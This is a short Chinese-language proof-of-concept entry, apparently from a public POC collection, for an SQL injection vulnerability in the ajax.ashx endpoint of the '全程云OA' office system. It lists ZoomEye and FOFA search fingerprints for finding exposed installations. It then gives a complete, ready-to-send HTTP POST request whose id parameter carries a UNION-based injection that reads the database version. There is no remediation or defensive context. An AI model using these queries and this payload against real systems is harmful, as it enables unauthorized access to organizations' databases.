## 全程云OA__ajax.ashxSQL注入漏洞

## zoomeye
```
app:"全程云OA"
```

## fofa
```
".passImg{background:url(images/yiyaoshi.png)"
```

## poc
```
POST /OA/common/mod/ajax.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

dll=DispartSell_Core.dll&class=DispartSell_Core.BaseData.DrpDataManager&method=GetProductById&id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+
```


![image](https://github.com/wy876/POC/assets/139549762/7ce08043-58c9-405b-9714-f7854852abf3)
